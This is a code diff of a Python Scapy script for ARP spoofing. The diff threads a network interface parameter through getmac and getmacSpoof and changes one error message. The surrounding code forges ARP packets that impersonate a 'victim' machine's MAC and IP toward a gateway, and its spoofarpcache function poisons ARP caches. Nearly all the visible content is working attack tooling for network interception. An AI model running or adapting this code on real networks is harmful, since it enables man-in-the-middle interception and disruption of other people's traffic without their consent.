@@ -5,13 +5,13 @@ from os import popen
 from random import randrange
 import signal
 
-def getmac(targetip):
+def getmac(targetip, iface):
   arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
-  targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
+  targetmac= srp(arppacket, timeout=2 , verbose= False,iface=iface)[0][0][1].hwsrc
   return targetmac
-def getmacSpoof(victimIP,victimMAC):
+def getmacSpoof(victimIP,victimMAC,iface):
   arppacket= Ether(src=victimMAC,dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst='10.12.21.1',psrc=victimIP,hwsrc=victimMAC)  
-  sendp(arppacket, verbose= False)
+  sendp(arppacket, verbose= False,iface=iface)
 def spoofarpcache(targetip, targetmac, sourceip, sourcemac):
   spoofed=  Ether(src=sourcemac)/ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac , hwsrc=sourcemac)
  
@@ -51,10 +51,10 @@ def main():
     popen('ip link del link '+interface+' '+vinterface)
     print "Clear config", vinterface
   except:
-    print "victim machine did not respond to ARP broadcast"
+    print "config fail"
     quit()
   try:
-    victimmac= getmac(victimip)
+    victimmac= getmac(victimip,interface)
     print "victim MAC", victimmac
   except:
     print "victim machine did not respond to ARP broadcast"
@@ -72,7 +72,7 @@ def main():
       # sendp(packets,iface=interface.rstrip(), verbose= False,inter=1)
 
       # spoofarpcache(targetip, targetmac, victimip,victimmac)
-      getmacSpoof(victimip,victimmac)
+      getmacSpoof(victimip,victimmac,interface)
 
       time.sleep(1)
       # spoofarpcache(gatewayip, gatewaymac, targetip)
